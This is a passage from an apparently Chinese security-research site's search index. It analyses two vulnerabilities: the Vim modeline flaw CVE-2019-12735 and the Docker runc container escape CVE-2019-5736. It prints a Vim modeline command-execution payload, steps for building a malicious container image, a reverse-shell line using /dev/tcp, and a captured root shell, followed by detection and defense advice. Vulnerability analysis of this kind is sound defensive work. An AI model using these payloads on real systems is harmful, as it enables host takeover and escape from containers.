Installed: 2:7.4.1689-3ubuntu1.4\n  Candidate: 2:7.4.1689-3ubuntu1.4\n  ...\n\n# \u914d\u7f6evimrc\u5f00\u542fmodeline\u529f\u80fd\nvim ~/.vimrc\ni\nset modeline\nset modelines=5\n<ESC>\n\n\n# \u6d4b\u8bd5\u6548\u679c\uff0c\u672a\u89e6\u53d1\u6f0f\u6d1e\n$ vim poc.txt\n:!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\"\n~                                                                      ...                                                                    \n~                                                                               \n\"poc.txt\" 1L, 75C",
            "title": "package\u7248\u672c\u68c0\u67e5"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#_4",
            "text": "# \u68c0\u67e5modeline\u914d\u7f6e:\n$ vim\n:verbose set modeline? \n:verbose set modelines?\n# \u5982\u679c\u663e\u793anomodeline, nomodelines\u8868\u793a\u6ca1\u6709\u914d\u7f6e\n\n# \u5982\u679c\u914d\u7f6e\u4e86\uff0c\u5219\u4f1a\u663e\u793a\uff1a\n\n...\n\uff5e                                                                 \n  modeline\n        Last set from ~/.vimrc\nPress ENTER or type command to continue\n\n...\n\uff5e\n  modelines=5\n        Last set from ~/.vimrc\nPress ENTER or type command to continue\n\n# \u5173\u95edmodeline\u914d\u7f6e\nvim ~/.vimrc\n\u5220\u9664\nset modeline\nset modelines=5\n\u6dfb\u52a0\nset nomodeline\n:wq\n\n# \u518d\u6b21\u68c0\u67e5\n$ vim\n:verbose set modeline? \n\n~                                                                     \nnomodeline\n        Last set from ~/.vimrc\nPress ENTER or type command to continue",
            "title": "\u914d\u7f6e\u68c0\u67e5"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#poc",
            "text": "\u8bfb\u53d6stdout  \u4ee3\u7801\u6267\u884cvim\u6253\u5f00poc\u8bfb\u53d6stdout\u6839\u636e\u8f93\u51fa\u5224\u65ad(\u76ee\u524d\u7684\u6765\u770b\uff0c\u83b7\u53d6vim\u7684\u8f93\u51fa\u8c8c\u4f3c\u6709\u4e9b\u9ebb\u70e6)  \u4e0d\u5b58\u5728\u6f0f\u6d1e\u65f6\u91cd\u5b9a\u5411stdout:   $ vim poc.txt >out.txt\nVim: Warning: Output is not to a terminal\n$ cat out.txt \n# \u5185\u5bb9\u4e3a\u7a7a   \u5b58\u5728\u6f0f\u6d1e\u65f6\u91cd\u5b9a\u5411stdout:   $ vim poc.txt > out.txt\nVim: Warning: Output is not to a terminal\n\nPress ENTER or type command to continue\n\n$ cat out.txt \nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux  \u68c0\u67e5\u8c03\u7528\u6808  \u7c7b\u4f3c\u7684\uff0c\u901a\u8fc7\u4ee3\u7801\u6267\u884cvim\u6253\u5f00poc\uff0cptrace\u8c03\u7528\u6808\uff0c\u68c0\u67e5\u662f\u5426\u6709do_shell\u8c03\u7528\u65e0\u6f0f\u6d1e\u65f6\u6b63\u5e38\u6253\u5f00poc\u6587\u4ef6\u540e\u7684\u8c03\u7528\u6808\uff1a  gdb-peda$ bt\n#0  0x00007fca6f40b5b3 in __select_nocancel ()\n#1  0x000000000052a69c in RealWaitForChar (fd=0x0, \n#2  0x000000000052a444 in WaitForCharOrMouse \n#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)\n#4  0x0000000000526147 in mch_inchar (buf=0x86c66a <typebuf_init+42> \n#5  0x00000000005c381e in ui_inchar (buf=0x86c66a <typebuf_init+42> \n#6  0x00000000004ad1fe in inchar (buf=0x86c66a <typebuf_init+42> \"\", \n#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832\n#8  0x00000000004ab07e in vgetc () at getchar.c:1605\n#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801\n#10 0x00000000004f8512 in normal_cmd (oap=0x7ffefbcad0c0, \n#11 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at \n#12 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffefbcad3b8) at \n...  \u5b58\u5728\u6f0f\u6d1e\u65f6\uff0c\u6253\u5f00poc\u6587\u4ef6\u540e\u7684\u8c03\u7528\u6808\uff0c\u6709\u4e00\u4e2a\u660e\u663e\u7684do_shell\u7684\u8c03\u7528:  gdb-peda$ bt\n#0  0x00007f4ba14135b3 in __select_nocancel ()\n#1  0x000000000052a69c in RealWaitForChar (fd=0x0, \n#2  0x000000000052a444 in WaitForCharOrMouse \n#3  0x000000000052a393 in WaitForChar (msec=0xffffffffffffffff)\n#4  0x0000000000526147 in mch_inchar (buf=0x86c66a <typebuf_init+42> \n#5  0x00000000005c381e in ui_inchar (buf=0x86c66a <typebuf_init+42> \n#6  0x00000000004ad1fe in inchar (buf=0x86c66a <typebuf_init+42> \"\", \n#7  0x00000000004ace26 in vgetorpeek (advance=0x1) at getchar.c:2832\n#8  0x00000000004ab07e in vgetc () at getchar.c:1605\n#9  0x00000000004ab526 in safe_vgetc () at getchar.c:1801\n#10 0x00000000004ce972 in wait_return (redraw=0x1) at message.c:901\n#11 0x000000000045ce32 in do_shell (\n    cmd=0x15c7ea0 \"uname -a||\\\" vi:fen:fdm=expr:fde=assert_fails(\\\"source!\\\\ %\\\"):fdl=0:fdt=\\\"\", flags=0x0) at ex_cmds.c:1572\n#12 0x000000000045c50c in do_bang (addr_count=0x0, \n#13 0x000000000047f480 in ex_bang (eap=0x7ffe20228c50) at \n#14 0x00000000004741d3 in do_one_cmd (cmdlinep=0x7ffe20228d80, \n#15 0x0000000000470d89 in do_cmdline (cmdline=0x0, \n#16 0x00000000005002cd in nv_colon (cap=0x7ffe202293f0) at \n#17 0x00000000004f9650 in normal_cmd (oap=0x7ffe20229480, \n#18 0x00000000005e96fb in main_loop (cmdwin=0x0, noexmode=0x0) at \n#19 0x00000000005e90e3 in main (argc=0x2, argv=0x7ffe20229778) at",
            "title": "poc\u9a8c\u8bc1"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/",
            "text": "Docker runc\u5bb9\u5668\u9003\u9038\u6f0f\u6d1e\u5206\u6790(CVE-2019-5736)\n\n\n0. \u4f5c\u8005\n\n\ninvincible1944@gmail.com\n\n\n1. \u80cc\u666f\u4ecb\u7ecd\n\n\n\n\n\u6f0f\u6d1e\u76f8\u5173\u8f6f\u4ef6   \n\n\n\n\nDocker < 18.09.2/runc < 1.0-rc6\n  \n\n\n\n\n\n\ndocker/runc\u7b80\u4ecb  \n\n\n\n\n\n\nDocker \u662f\u4e00\u4e2a\u5bb9\u5668\u7ba1\u7406\u5e73\u53f0\uff0c\u63d0\u4f9b\u5bf9\u5bb9\u5668\u7684\u4e0a\u5c42\u7ba1\u7406\u529f\u80fd(\u5bb9\u5668\u955c\u50cf\u521b\u5efa\u548c\u7ba1\u7406\u3001\u7528\u6237\u5c42\u547d\u4ee4\u884c\u5de5\u5177\u3001Daemon\u670d\u52a1\u3001API\u63a5\u53e3\u7b49)\u3002  \n\n\n\n\n\n\nrunc\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5b83\u6839\u636e OCI \u6807\u51c6\u6765\u521b\u5efa\u548c\u8fd0\u884c\u5bb9\u5668\uff0c\u53ef\u4ee5\u4e0d\u7528\u901a\u8fc7 docker \u5f15\u64ce\uff0c\u76f4\u63a5\u521b\u5efa\u548c\u8fd0\u884c\u5bb9\u5668\u3002Docker\u5e95\u5c42\u7684\u5bb9\u5668\u521b\u5efa\u3001\u8fd0\u884c\u7b49\u64cd\u4f5c\u5c31\u662f\u901a\u8fc7runc\u5b8c\u6210\u3002\n\n\n\n\n\n\nOCI (Open Container Initiative)\u5f00\u653e\u5bb9\u5668\u8ba1\u5212\u662fLinux\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u9879\u76ee\uff0c\u65e8\u5728\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7ea7\u865a\u62df\u5316\uff08\u6700\u91cd\u8981\u7684\u662fLinux\u5bb9\u5668\uff09\u8bbe\u8ba1\u5f00\u653e\u6807\u51c6\u3002\n\n\n\n\n\n\n\n\n\n\n\u6f0f\u6d1e\u5371\u5bb3  \n\n\n\n\n\u5f53\u8fd0\u884c\u4e00\u4e2a\u6076\u610f\u6784\u9020\u7684\u5bb9\u5668\u65f6(\ndocker run\n)\uff0c\u5bb9\u5668\u8fdb\u7a0b\u80fd\u591f\u4fee\u6539\u5bbf\u4e3b\u673a\u4e2d\u7684runc\u53ef\u6267\u884c\u6587\u4ef6;\n\n\n\u5f53\u8fd0\u884c\u4e00\u4e2a\u6076\u610f\u5bb9\u5668\u8fdb\u7a0b\u65f6(\ndocker exec\n)\uff0c\u6076\u610f\u5bb9\u5668\u8fdb\u7a0b\u80fd\u591f\u4fee\u6539\u5bbf\u4e3b\u673a\u4e2d\u7684runc\u53ef\u6267\u884c\u6587\u4ef6;\n\n\n\u5f53\u518d\u6b21\u4f7f\u7528Docker\u547d\u4ee4\u65f6\uff0c\u4f1a\u4ee5root\u6743\u9650\u52a0\u8f7d\u5e76\u6267\u884c\u4fee\u6539\u540e\u7684runc\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4ece\u800c\u5b9e\u73b0\u5bb9\u5668\u9003\u9038\u3002\n\n\n\n\n\n\n\n\n\u76f8\u5173\u80cc\u666f\u77e5\u8bc6\n\n\u89c1\u9644\u4ef6\uff1acve-2019-5736-01\n\n\n\n\n\n\n2. \u6f0f\u6d1e\u5206\u6790\n\n\n\n\n\n\n\u6f0f\u6d1e\u539f\u7406\uff1a\u7531\u4e8e\u9694\u79bb\u4e0d\u5b8c\u5168\uff0c\u5bb9\u5668\u5185\u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7/proc/self/exe\u7b26\u53f7\u94fe\u63a5\uff0c\u4fee\u6539\u5bb9\u5668\u5916\u7684runc\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4ece\u800c\u501f\u52a9runc\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u5b9e\u73b0\u5bb9\u5668\u9003\u9038\u3002  \n\n\n\n\n\n\n\u6f0f\u6d1e\u6240\u5c5e\u8f6f\u4ef6\u94fe\u63a5\uff0c\u7248\u672c\uff0c\u6a21\u5757\uff0c\u76ee\u5f55\uff0c\u6587\u4ef6\uff0c\u4ee3\u7801\u884c\n\n\n\n\n\u6f0f\u6d1e\u8f6f\u4ef6\u7248\u672c\uff1a\nrunc < 1.0-rc6\n\n\n\u6f0f\u6d1e\u4ee3\u7801\u4f4d\u7f6e\uff1a\nrunc/libcontainer/nsenter/nsexec.c -> nsexec()\n  \n\n\nrunc \u6e90\u7801\u5e93\n  \n\n\n\n\n\n\n\n\n\u6f0f\u6d1e\u6240\u5c5e\u7c7b\u578b\uff1a\u5bb9\u5668\u9003\u9038\u6f0f\u6d1e\n\n\n\n\n\n\n\u6f0f\u6d1e\u8865\u4e01\uff1a\nmerge branch 'cve-2019-5736'\n\n\n\n\n\n\n\u6f0f\u6d1eCVE\u53f7\uff1a\nCVE-2019-5736\n\n\n\n\n\n\n3. POC\n\n\na. POC\u539f\u7406\n\n\n\u8be5\u6f0f\u6d1e\u5229\u7528\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a\u901a\u8fc7\u6784\u9020\u6076\u610f\u5bb9\u5668\uff0c\u5728\u5bb9\u5668\u542f\u52a8\u65f6\u89e6\u53d1(\ndocker run\n)\uff1b\u901a\u8fc7\u6784\u9020\u5bb9\u5668\u5185\u7684\u6076\u610f\u8fdb\u7a0b\uff0c\u5728\u6267\u884c\u5bb9\u5668\u8fdb\u7a0b\u65f6\u89e6\u53d1(\ndocker exec\n)\u3002  \n\n\n\u7b2c\u4e00\u79cd\u65b9\u5f0f\u7684\u573a\u666f\u66f4\u52a0\u5177\u6709\u5a01\u80c1\uff0c\u4e0b\u9762\u8bf4\u660e\u7b2c\u4e00\u79cd\u65b9\u5f0fPoC\u7684\u539f\u7406\uff1a\n\n\n1.\u521b\u5efa\u4e00\u4e2a\u5bb9\u5668image\uff0c\u5728image\u4e2d\u6784\u9020runc\u6267\u884c\u9700\u8981\u7684\u4f9d\u8d56\u5e93libseccomp\uff0c\u5c06\u6076\u610f\u4ee3\u7801\u63d2\u5165libseccomp\u6e90\u7801\uff0c\u5e76\u91cd\u65b0\u7f16\u8bd1\u3002\n\n\n2.\u5c06\n/proc/self/exe\n\u94fe\u63a5\u5230\u5bb9\u5668\u7684ENTRYPOINT\uff0c\u4f7frunc\u6267\u884c\u5bb9\u5668\u8fdb\u7a0b\u7684\u65f6\u5019\u6267\u884c\u5b83\u81ea\u5df1(\n/proc/self/exe\n)\uff0c\u800c\u6267\u884c\u73af\u5883\u5374\u662f\u5728\u5bb9\u5668image\u4e2d\uff0c\u8fdb\u800c\u5bfc\u81f4\u6076\u610f\u7684libseccomp.so\u88abrunc\u8fdb\u7a0b\u52a0\u8f7d\uff0c\u5176\u4e2d\u7684\u6076\u610f\u4ee3\u7801\u5c06\u901a\u8fc7\n/proc/self/exe\n\u4fee\u6539\u5bbf\u4e3b\u673a\u4e2d\u7684runc\u53ef\u6267\u884c\u6587\u4ef6\u3002\n\n\n3.\u5728\u7528\u6237\u4e0b\u4e00\u6b21\u6267\u884crunc\u547d\u4ee4\u7684\u65f6\u5019\uff0c\u4f1a\u901a\u8fc7root\u6743\u9650\u6267\u884c\u88ab\u4fee\u6539\u8fc7\u7684\u6587\u4ef6(docker daemon\u8fdb\u7a0b\u662f\u901a\u8fc7root\u6743\u9650\u6267\u884crunc\u6307\u4ee4\u7684)\uff0c\u8fdb\u800c\u5bfc\u81f4\u547d\u4ee4\u6267\u884c\u3002\n\n\n\u5177\u4f53\u89c1\u9644\u4ef6CVE-2019-5736-\u9644\u4ef6\uff0c\u590d\u73b0\u73af\u5883Poc\u90e8\u5206\u3002  \n\n\n\u901a\u8fc7\u6267\u884c\u5bb9\u5668\u8fdb\u7a0b\u89e6\u53d1\u7684\u65b9\u5f0f\uff0c\u89c1\u9644\u4ef6CVE-2019-5736-\u9644\u4ef6\uff0c\u5176\u4ed6Poc\u90e8\u5206\u3002\n\n\nb. POC\u6e90\u7801\n\n\nGithub PoC: \nby q3k@github\n  \n\n\n\u590d\u73b0\u73af\u5883PoC \u89c1\u9644\u4ef6: CVE-2019-5736-\u9644\u4ef6->\u590d\u73b0\u73af\u5883PoC\u90e8\u5206\n\n\nc. \u590d\u73b0\u6b65\u9aa4\n\n\n\n\n\n\n\u590d\u73b0\u73af\u5883\n\n\n\n\n\u73af\u5883\u6e05\u5355\n\n\n\u7cfb\u7edf\u7248\u672c: Ubuntu 18.04.4 LTS (Bionic Beaver)    \n\n\ndocker\u7248\u672c: \nDocker version 17.12.1-ce, build 7390fc6\n \n\n\nrunc\u7248\u672c: \nrunc version 1.0.0-rc4+dev\n\n\n\u865a\u62df\u673a\u8f6f\u4ef6\uff1aVMwareFusion \u4e13\u4e1a\u7248 11.5.1 (15018442)  \n\n\n\u865a\u62df\u673a\u8f6f\u4ef6\uff1aQEMU emulator version 4.2.0  \n\n\n\n\n\n\n\u73af\u5883\u642d\u5efa\uff1a\u89c1\u9644\u4ef6\uff1acve-2018-1000001-01 -> \u73af\u5883\u642d\u5efa\u90e8\u5206 \n\n\n\n\n\n\n\n\nStep1 - \u6784\u5efa\u6076\u610f\u5bb9\u5668\n\n\n\n\n\n\n# \u4e0b\u8f7d\u5e76\u89e3\u538bPoc\nroot# ls -l\ntotal 16\n-rwxr-xr-x 1 invincible invincible 624 Apr\u00a0 8 00:36 Dockerfile\n-rwxr-xr-x 1 invincible invincible 249 Feb 11\u00a0 2019 README\n-rwxr-xr-x 1 invincible invincible 672 Apr\u00a0 8 00:38 stage1.c\n-rwxr-xr-x 1 invincible invincible 390 Feb 11\u00a0 2019 stage2.c\n\n# \u8fd9\u4e00\u6b65\u9700\u8981\u4e00\u4e9b\u65f6\u95f4\nroot# docker bulid -t cve .\nSending build context to Docker daemon\u00a0 6.144kB\nStep 1/8 : FROM ubuntu:18.04\n...\n\n\n\n\n\n\nStep2 - \u8fd0\u884c\u5bb9\u5668\n\n\n\n\nroot# docker run cve\nHAX2: argv: /proc/self/fd/3\nHAX2: fd: 4\nHAX2: res: 13, 0\n\n\n\n\n\n\n\u67e5\u770bPoC \u6548\u679c\n\n\n\n\nroot# strings /usr/bin/docker-runc | tail -n 2\n.debug_gdb_scripts\ncve-2019-5736\n\n\n\n\n4. EXP\n\n\na. EXP\u539f\u7406\n\n\n\u540cPoC\u539f\u7406\u7c7b\u4f3c\uff0c\u53ea\u662f\u5c06\u8986\u76d6runc\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5185\u5bb9\u4fee\u6539\u4e3a\u53cd\u5f39shell\u7684\u6076\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002  \n\n\nb. EXP\u6e90\u7801\n\n\nGithub Exp: \ntwistlock@github\n\n\nc. \u590d\u73b0\u6b65\u9aa4\n\n\n\n\n\n\n\u642d\u5efa\u590d\u73b0\u73af\u5883\uff0c\u4e0ePOC\u4e2d\u7684\u73af\u5883\u76f8\u540c\n\n\n\n\n\n\nStep1 - \u4e0b\u8f7dexp\n\n\n\n\n\n\ngit clone https://github.com/twistlock/RunC-CVE-2019-5736\n\n\n\n\n\n\nStep2 - \u521b\u5efa\u5bb9\u5668\u955c\u50cf\n\n\n\n\nsudo docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC\n\n\n\n\n\n\nStep3 - nc\u5f00\u542f\u76d1\u542c\u7aef\u53e3\n\n\n\n\nnc -nvlp 2345\n\n\n\n\n\n\nStep4 - \u542f\u52a8\u5bb9\u5668\n\n\u5728\u6b64\u6b65\u9aa4\u4e4b\u524d\uff0c\u8981\u5148\u5907\u4efddocker-runc\u6587\u4ef6\n\n\n\n\nsudo docker run --rm cve-2019-5736:malicious_image_POC\n\n\n\n\n\n\n\u56de\u8bdd\u5efa\u7acb\u6210\u529f\n\n\n\n\n$ nc -nvlp 2345\nListening on [0.0.0.0] (family 0, port 2345)\nConnection from 127.0.0.1 60968 received!\nbash: cannot set terminal process group (44874): Inappropriate ioctl for device\nbash: no job control in this shell\n<faa22423a51484667b34a86e17683ae80bd44930d00b71dd6# id\nid\nuid=0(root) gid=0(root) groups=0(root)\n\n\n\n\n\n\n\n\ndocker-runc\u53ef\u6267\u884c\u6587\u4ef6\u4fee\u6539\u6210\u529f\n\n\n\n\n$ which docker-runc \n/usr/bin/docker-runc\n$ cat /usr/bin/docker-runc \n#!/bin/bash\nbash -i >& /dev/tcp/0.0.0.0/2345 0>&1 &\n\n\n\n\nd. \u5229\u7528\u6838\u5fc3\u8981\u7d20\n\n\n\u5bb9\u5668\u8fdb\u7a0b\u901a\u8fc7/proc\u6587\u4ef6\u7cfb\u7edf\uff0c\u8bbf\u95ee\u5e76\u4fee\u6539\u5bbf\u4e3b\u673a\u7684\u53ef\u6267\u884c\u6587\u4ef6\n\n\n5. \u9632\u62a4\u5efa\u8bae\n\n\na. \u5982\u4f55\u68c0\u6d4b\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e  \n\n\n\n\n\n\n\u68c0\u6d4brunc/docker-runc\u7248\u672c\u662f\u5426\u4e3a\u6f0f\u6d1e\u4fee\u590d\u540e\u7684\u7248\u672c\u3002\n\n\n\n\n\n\n\u68c0\u6d4brunc\u53ef\u6267\u884c\u6587\u4ef6\u7684hash\u503c\u662f\u5426\u4e0e\u539f\u59cb\u5305\u4e2d\u7684\u4e00\u81f4\u3002\n\n\n\n\n\n\n\u6267\u884cPoc\u811a\u672c\u6d4b\u8bd5\u80fd\u5426\u6210\u529f\u3002\n\n\n\n\n\n\nb. \u5982\u4f55\u9632\u5fa1\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e  \n\n\n\n\n\n\n\u5bf9\u6765\u6e90\u4e0d\u660e\u7684Docker\u5bb9\u5668\u955c\u50cf\u626b\u63cf\uff0c\u68c0\u6d4b\u662f\u5426\u6709\u5305\u542b\n\"#!/proc/self/exe\"\n\u5b57\u7b26\u4e32\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5982\u679c\u6709\u5219\u89c6\u4e3a\u53ef\u7591\u955c\u50cf\u963b\u6b62\u5176\u8fd0\u884c(\u8fd9\u53ea\u80fd\u9632\u5fa1\u6076\u610f\u5bb9\u5668\u8fdb\u7a0b\u7684\u5229\u7528\u65b9\u5f0f)\u3002\n\n\n\n\n\n\n\u5bf9\u6765\u6e90\u4e0d\u660e\u7684Docker\u5bb9\u5668\u955c\u50cf\u5165\u53e3\u8fdb\u7a0b\u626b\u63cf\uff0c\u68c0\u6d4b\u5176\u662f\u5426\u5b58\u5728\u5bf9runc\u53ef\u6267\u884c\u6587\u4ef6\u7684\u64cd\u4f5c\u884c\u4e3a\u3002\n\n\n\n\n\n\n\u68c0\u6d4brunc\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4fee\u6539\uff0c\u5e76\u963b\u6b62\u4fee\u6539\u540e\u7684runc\u6587\u4ef6\u6267\u884c\u3002\n\n\n\n\n\n\nc. \u6709\u6ca1\u6709\u54ea\u79cd\u901a\u7528\u7684\u7f13\u89e3\u63aa\u65bd\u53ef\u4ee5\u963b\u65ad\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e  \n\n\n\n\n\n\n\u5b89\u88c5\u6700\u65b0\u7248\u672c\u7684Docker/runc\u3002\n\n\n\n\n\n\n\u76d1\u63a7\u5bb9\u5668\u8fdb\u7a0b\u6587\u4ef6\u64cd\u4f5c\uff0c\u5f53\u5176\u64cd\u4f5c\u7684\u6587\u4ef6\u5c5e\u4e8e\u5bbf\u4e3b\u673a\u6587\u4ef6\u65f6\uff0c\u5c06\u5176\u963b\u65ad\u3002\n\n\n\n\n\n\n6.\u53c2\u8003\n\n\nhttps://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html\n\n\nhttps://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d\n\n\nhttps://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/",
            "title": "Cve 2019 5736 \u5206\u6790"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#docker-runccve-2019-5736",
            "text": "",
            "title": "Docker runc\u5bb9\u5668\u9003\u9038\u6f0f\u6d1e\u5206\u6790(CVE-2019-5736)"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#0",
            "text": "invincible1944@gmail.com",
            "title": "0. \u4f5c\u8005"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#1",
            "text": "\u6f0f\u6d1e\u76f8\u5173\u8f6f\u4ef6      Docker < 18.09.2/runc < 1.0-rc6       docker/runc\u7b80\u4ecb      Docker \u662f\u4e00\u4e2a\u5bb9\u5668\u7ba1\u7406\u5e73\u53f0\uff0c\u63d0\u4f9b\u5bf9\u5bb9\u5668\u7684\u4e0a\u5c42\u7ba1\u7406\u529f\u80fd(\u5bb9\u5668\u955c\u50cf\u521b\u5efa\u548c\u7ba1\u7406\u3001\u7528\u6237\u5c42\u547d\u4ee4\u884c\u5de5\u5177\u3001Daemon\u670d\u52a1\u3001API\u63a5\u53e3\u7b49)\u3002      runc\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5b83\u6839\u636e OCI \u6807\u51c6\u6765\u521b\u5efa\u548c\u8fd0\u884c\u5bb9\u5668\uff0c\u53ef\u4ee5\u4e0d\u7528\u901a\u8fc7 docker \u5f15\u64ce\uff0c\u76f4\u63a5\u521b\u5efa\u548c\u8fd0\u884c\u5bb9\u5668\u3002Docker\u5e95\u5c42\u7684\u5bb9\u5668\u521b\u5efa\u3001\u8fd0\u884c\u7b49\u64cd\u4f5c\u5c31\u662f\u901a\u8fc7runc\u5b8c\u6210\u3002    OCI (Open Container Initiative)\u5f00\u653e\u5bb9\u5668\u8ba1\u5212\u662fLinux\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u9879\u76ee\uff0c\u65e8\u5728\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7ea7\u865a\u62df\u5316\uff08\u6700\u91cd\u8981\u7684\u662fLinux\u5bb9\u5668\uff09\u8bbe\u8ba1\u5f00\u653e\u6807\u51c6\u3002      \u6f0f\u6d1e\u5371\u5bb3     \u5f53\u8fd0\u884c\u4e00\u4e2a\u6076\u610f\u6784\u9020\u7684\u5bb9\u5668\u65f6( docker run )\uff0c\u5bb9\u5668\u8fdb\u7a0b\u80fd\u591f\u4fee\u6539\u5bbf\u4e3b\u673a\u4e2d\u7684runc\u53ef\u6267\u884c\u6587\u4ef6;  \u5f53\u8fd0\u884c\u4e00\u4e2a\u6076\u610f\u5bb9\u5668\u8fdb\u7a0b\u65f6( docker exec )\uff0c\u6076\u610f\u5bb9\u5668\u8fdb\u7a0b\u80fd\u591f\u4fee\u6539\u5bbf\u4e3b\u673a\u4e2d\u7684runc\u53ef\u6267\u884c\u6587\u4ef6;  \u5f53\u518d\u6b21\u4f7f\u7528Docker\u547d\u4ee4\u65f6\uff0c\u4f1a\u4ee5root\u6743\u9650\u52a0\u8f7d\u5e76\u6267\u884c\u4fee\u6539\u540e\u7684runc\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4ece\u800c\u5b9e\u73b0\u5bb9\u5668\u9003\u9038\u3002     \u76f8\u5173\u80cc\u666f\u77e5\u8bc6 \n\u89c1\u9644\u4ef6\uff1acve-2019-5736-01",
            "title": "1. \u80cc\u666f\u4ecb\u7ecd"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#2",
            "text": "\u6f0f\u6d1e\u539f\u7406\uff1a\u7531\u4e8e\u9694\u79bb\u4e0d\u5b8c\u5168\uff0c\u5bb9\u5668\u5185\u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7/proc/self/exe\u7b26\u53f7\u94fe\u63a5\uff0c\u4fee\u6539\u5bb9\u5668\u5916\u7684runc\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4ece\u800c\u501f\u52a9runc\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u5b9e\u73b0\u5bb9\u5668\u9003\u9038\u3002      \u6f0f\u6d1e\u6240\u5c5e\u8f6f\u4ef6\u94fe\u63a5\uff0c\u7248\u672c\uff0c\u6a21\u5757\uff0c\u76ee\u5f55\uff0c\u6587\u4ef6\uff0c\u4ee3\u7801\u884c   \u6f0f\u6d1e\u8f6f\u4ef6\u7248\u672c\uff1a runc < 1.0-rc6  \u6f0f\u6d1e\u4ee3\u7801\u4f4d\u7f6e\uff1a runc/libcontainer/nsenter/nsexec.c -> nsexec()     runc \u6e90\u7801\u5e93        \u6f0f\u6d1e\u6240\u5c5e\u7c7b\u578b\uff1a\u5bb9\u5668\u9003\u9038\u6f0f\u6d1e    \u6f0f\u6d1e\u8865\u4e01\uff1a merge branch 'cve-2019-5736'    \u6f0f\u6d1eCVE\u53f7\uff1a CVE-2019-5736",
            "title": "2. \u6f0f\u6d1e\u5206\u6790"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#3-poc",
            "text": "",
            "title": "3. POC"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#a-poc",
            "text": "\u8be5\u6f0f\u6d1e\u5229\u7528\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a\u901a\u8fc7\u6784\u9020\u6076\u610f\u5bb9\u5668\uff0c\u5728\u5bb9\u5668\u542f\u52a8\u65f6\u89e6\u53d1( docker run )\uff1b\u901a\u8fc7\u6784\u9020\u5bb9\u5668\u5185\u7684\u6076\u610f\u8fdb\u7a0b\uff0c\u5728\u6267\u884c\u5bb9\u5668\u8fdb\u7a0b\u65f6\u89e6\u53d1( docker exec )\u3002    \u7b2c\u4e00\u79cd\u65b9\u5f0f\u7684\u573a\u666f\u66f4\u52a0\u5177\u6709\u5a01\u80c1\uff0c\u4e0b\u9762\u8bf4\u660e\u7b2c\u4e00\u79cd\u65b9\u5f0fPoC\u7684\u539f\u7406\uff1a  1.\u521b\u5efa\u4e00\u4e2a\u5bb9\u5668image\uff0c\u5728image\u4e2d\u6784\u9020runc\u6267\u884c\u9700\u8981\u7684\u4f9d\u8d56\u5e93libseccomp\uff0c\u5c06\u6076\u610f\u4ee3\u7801\u63d2\u5165libseccomp\u6e90\u7801\uff0c\u5e76\u91cd\u65b0\u7f16\u8bd1\u3002  2.\u5c06 /proc/self/exe \u94fe\u63a5\u5230\u5bb9\u5668\u7684ENTRYPOINT\uff0c\u4f7frunc\u6267\u884c\u5bb9\u5668\u8fdb\u7a0b\u7684\u65f6\u5019\u6267\u884c\u5b83\u81ea\u5df1( /proc/self/exe )\uff0c\u800c\u6267\u884c\u73af\u5883\u5374\u662f\u5728\u5bb9\u5668image\u4e2d\uff0c\u8fdb\u800c\u5bfc\u81f4\u6076\u610f\u7684libseccomp.so\u88abrunc\u8fdb\u7a0b\u52a0\u8f7d\uff0c\u5176\u4e2d\u7684\u6076\u610f\u4ee3\u7801\u5c06\u901a\u8fc7 /proc/self/exe \u4fee\u6539\u5bbf\u4e3b\u673a\u4e2d\u7684runc\u53ef\u6267\u884c\u6587\u4ef6\u3002  3.\u5728\u7528\u6237\u4e0b\u4e00\u6b21\u6267\u884crunc\u547d\u4ee4\u7684\u65f6\u5019\uff0c\u4f1a\u901a\u8fc7root\u6743\u9650\u6267\u884c\u88ab\u4fee\u6539\u8fc7\u7684\u6587\u4ef6(docker 